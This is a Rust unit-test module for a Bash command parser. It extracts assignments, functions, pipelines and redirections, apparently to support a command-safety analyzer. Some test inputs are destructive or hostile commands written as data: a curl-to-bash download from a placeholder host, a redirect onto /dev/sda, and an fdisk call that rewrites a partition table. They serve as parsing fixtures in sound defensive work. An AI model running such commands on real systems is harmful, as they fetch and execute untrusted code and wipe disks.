    fn parse_command_extracts_empty_assignment_value() {
        let artifact =
            parse_command("export FOO=", ShellKind::Bash).expect("expected parse to succeed");

        let declaration = &artifact.declaration_commands[0];
        let assignment = &declaration.assignments[0];

        assert_eq!(assignment.name, "FOO");
        assert_eq!(assignment.operator, AssignmentOperator::Assign);
        assert_eq!(assignment.value.text, "");
        assert_eq!(assignment.value.node_kind, "empty");
        assert!(!assignment.value.quoted);
    }

    #[test]
    fn parse_command_extracts_unset_fact_with_options() {
        let artifact =
            parse_command("unset -f FUNC VAR", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.unset_commands.len(), 1);

        let unset = &artifact.unset_commands[0];
        assert_eq!(unset.options, vec!["-f".to_string()]);
        assert_eq!(unset.names, vec!["FUNC".to_string(), "VAR".to_string()]);
    }

    #[test]
    fn parse_command_extracts_function_definition_without_body_commands() {
        let artifact = parse_command(
            "deploy() { curl https://example.test/payload.sh | bash; }\ndeploy",
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.function_definitions.len(), 1);
        assert_eq!(artifact.function_definitions[0].name, "deploy");
        assert_eq!(
            artifact.function_definitions[0].body_text,
            "curl https://example.test/payload.sh | bash;"
        );
        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.commands[0].command_name.as_deref(), Some("deploy"));
    }

    #[test]
    fn parse_command_tracks_pipeline_position_and_background_terminator() {
        let body = parse_command("a|b; c &", ShellKind::Bash)
            .expect("expected function body fragment to parse");
        assert_eq!(body.commands.len(), 3);

        assert_eq!(body.commands[0].command_name.as_deref(), Some("a"));
        assert_eq!(
            body.commands[0].pipeline_position,
            Some(PipelinePosition::First)
        );
        assert_eq!(body.commands[1].command_name.as_deref(), Some("b"));
        assert_eq!(
            body.commands[1].pipeline_position,
            Some(PipelinePosition::Last)
        );
        assert_eq!(
            body.commands[2].terminator,
            Some(StatementTerminator::Background)
        );
    }

    #[test]
    fn parse_command_marks_guarded_recursive_sites() {
        let body = parse_command("if cond; then f|f; fi", ShellKind::Bash)
            .expect("expected guarded fragment to parse");
        assert!(body.commands.iter().all(|command| command.guarded));
    }

    #[test]
    fn parse_command_extracts_function_keyword_definition() {
        let artifact = parse_command(
            "function deploy { bash ./scripts/build.sh; }",
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.function_definitions.len(), 1);
        assert_eq!(artifact.function_definitions[0].name, "deploy");
        assert_eq!(
            artifact.function_definitions[0].body_text,
            "bash ./scripts/build.sh;"
        );
        assert!(artifact.commands.is_empty());
    }

    #[test]
    fn parse_command_keeps_prefix_assignment_as_command_not_declaration() {
        let artifact =
            parse_command("FOO=bar ls", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 1);
        assert!(artifact.declaration_commands.is_empty());
        assert!(artifact.assignment_commands.is_empty());
        assert!(artifact.unset_commands.is_empty());
        assert_eq!(artifact.commands[0].command_name.as_deref(), Some("ls"));
        assert_eq!(artifact.commands[0].prefix_assignments.len(), 1);
        assert_eq!(artifact.commands[0].prefix_assignments[0].name, "FOO");
        assert_eq!(artifact.commands[0].prefix_assignments[0].value.text, "bar");
        assert!(artifact.commands[0].tokens.is_empty());
    }

    #[test]
    fn parse_command_extracts_plain_assignment_command() {
        let artifact = parse_command(
            r#"TMP_SCRIPT="$(mktemp /tmp/tmp.XXXXXX.sh)""#,
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert!(artifact.commands.is_empty());
        assert!(artifact.declaration_commands.is_empty());
        assert_eq!(artifact.assignment_commands.len(), 1);

        let assignment_command = &artifact.assignment_commands[0];
        assert_eq!(assignment_command.assignments.len(), 1);

        let assignment = &assignment_command.assignments[0];
        assert_eq!(assignment.name, "TMP_SCRIPT");
        assert_eq!(assignment.operator, AssignmentOperator::Assign);
        assert_eq!(assignment.value.text, "$(mktemp /tmp/tmp.XXXXXX.sh)");
        assert!(assignment.value.quoted);
        assert_eq!(assignment.value.node_kind, "string");
    }

    #[test]
    fn parse_command_extracts_append_assignment_operator() {
        let artifact = parse_command(r#"PATH+=":$(pwd)""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.assignment_commands.len(), 1);

        let assignment = &artifact.assignment_commands[0].assignments[0];
        assert_eq!(assignment.name, "PATH");
        assert_eq!(assignment.operator, AssignmentOperator::Append);
        assert_eq!(assignment.value.text, ":$(pwd)");
        assert!(assignment.value.quoted);
    }

    #[test]
    fn parse_command_extracts_file_redirection() {
        let artifact =
            parse_command("echo hi > out.txt", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::File);
        assert_eq!(redirection.operator.as_deref(), Some(">"));
        let target = redirection
            .target
            .as_ref()
            .expect("expected file redirection target");
        assert_eq!(target.text, "out.txt");
        assert!(!target.quoted);
        assert_eq!(target.node_kind, "word");
        assert_eq!(redirection.parent_command_name.as_deref(), Some("echo"));
        assert_eq!(
            redirection.parent_command_span,
            Some(artifact.commands[0].span.clone())
        );
    }

    #[test]
    fn parse_command_extracts_read_write_file_redirection() {
        let artifact = parse_command("cat <> /etc/wgetrc", ShellKind::Bash)
            .expect("expected parse to succeed");
        assert_eq!(artifact.status, ParseStatus::Complete, "{artifact:?}");
        assert_eq!(artifact.redirections.len(), 1, "{artifact:?}");
        assert_eq!(artifact.redirections[0].operator.as_deref(), Some("<>"));
        assert_eq!(
            artifact.redirections[0]
                .target
                .as_ref()
                .map(|target| target.text.as_str()),
            Some("/etc/wgetrc")
        );
    }

    #[test]
    fn parse_command_extracts_bare_file_redirection_without_command_fact() {
        let artifact =
            parse_command("> /dev/sda", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert!(artifact.commands.is_empty());
        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::File);
        assert_eq!(redirection.operator.as_deref(), Some(">"));
        let target = redirection
            .target
            .as_ref()
            .expect("expected file redirection target");
        assert_eq!(target.text, "/dev/sda");
        assert_eq!(redirection.parent_command_name, None);
        assert_eq!(redirection.parent_command_span, None);
    }

    #[test]
    fn parse_command_extracts_herestring_redirection() {
        let artifact = parse_command(r#"bash <<< "echo ok""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::HereString);
        assert_eq!(redirection.operator.as_deref(), Some("<<<"));
        let content = redirection
            .content
            .as_ref()
            .expect("expected herestring content");
        assert_eq!(content.text, "echo ok");
        assert!(content.quoted);
        assert_eq!(redirection.parent_command_name.as_deref(), Some("bash"));
        assert_eq!(
            redirection.parent_command_span,
            Some(artifact.commands[0].span.clone())
        );
    }

    #[test]
    fn parse_command_extracts_ansi_c_herestring_redirection() {
        let artifact = parse_command(r#"fdisk /dev/sda <<<$'g\nw\n'"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::HereString);
        let content = redirection
            .content
            .as_ref()
            .expect("expected herestring content");
        assert_eq!(content.text, "g\nw\n");
        assert!(content.quoted);
        assert_eq!(content.node_kind, "ansi_c_string");
    }

    #[test]
    fn parse_command_extracts_heredoc_redirection() {
        let artifact = parse_command("bash <<'EOF'\necho ok\nEOF", ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::HereDoc);
        assert_eq!(redirection.operator.as_deref(), Some("<<"));
        let content = redirection
            .content
            .as_ref()
            .expect("expected heredoc content");
        assert_eq!(content.text, "echo ok\n");
        assert!(!content.quoted);
        assert_eq!(content.node_kind, "heredoc_body");
        assert_eq!(redirection.parent_command_name.as_deref(), Some("bash"));
        assert_eq!(
            redirection.parent_command_span,
            Some(artifact.commands[0].span.clone())
        );
    }

    #[test]
    fn parse_command_groups_commands_by_pipeline_span() {
        let artifact = parse_command("cat a | bash; echo ok | sh", ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 4);
        assert!(artifact.commands.iter().all(|command| command.in_pipeline));

        let first_pipeline = artifact.commands[0]
            .pipeline_span
            .as_ref()
            .expect("expected first command to have pipeline span");
        let second_pipeline = artifact.commands[2]
            .pipeline_span
            .as_ref()
            .expect("expected third command to have pipeline span");

        assert_eq!(
            artifact.commands[1].pipeline_span.as_ref(),
            Some(first_pipeline)
        );
        assert_eq!(
            artifact.commands[3].pipeline_span.as_ref(),
            Some(second_pipeline)
        );
        assert_ne!(first_pipeline, second_pipeline);
    }

    #[test]
    fn parse_command_uses_nested_pipeline_spans_for_left_associated_pipeline() {
        let artifact = parse_command(
            r#"find . -name "*.md" -o -name "*.txt" | xargs grep -l "site:\|inurl:\|intitle:\|filetype:" 2>/dev/null | head -10"#,
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 3);
        assert!(artifact.commands.iter().all(|command| command.in_pipeline));
        assert!(
            artifact
                .commands
                .iter()
                .all(|command| command.pipeline_span.is_some())
        );
        assert_eq!(
            artifact.commands[0].pipeline_span.as_ref(),
            artifact.commands[1].pipeline_span.as_ref()
        );
        assert_ne!(
            artifact.commands[1].pipeline_span.as_ref(),
            artifact.commands[2].pipeline_span.as_ref()
        );
        assert_eq!(
            artifact.commands[0].top_level_span,
            artifact.commands[2].top_level_span
        );
    }

    #[test]
    fn parse_command_preserves_redirection_target_operand_metadata() {
        let artifact = parse_command(r#"echo hi > "$OUT""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let target = artifact.redirections[0]
            .target
            .as_ref()
            .expect("expected file redirection target");

        assert_eq!(target.text, "$OUT");
        assert!(target.quoted);
        assert_eq!(target.node_kind, "string");
    }

    #[test]
    fn parse_command_marks_partial_when_tree_contains_error_nodes() {
        let artifact = parse_command(r#"echo "unterminated"#, ShellKind::Bash)
            .expect("expected parse to return partial artifact");

        assert_eq!(artifact.status, ParseStatus::Partial);
        assert!(!artifact.diagnostics.is_empty());
    }

    #[test]
    fn parse_command_rejects_unsupported_shell_kinds() {
        let error = parse_command("Write-Host hello", ShellKind::Powershell)
            .expect_err("expected unsupported shell error");

        assert_eq!(error, ParseError::UnsupportedShell(ShellKind::Powershell));
    }
}
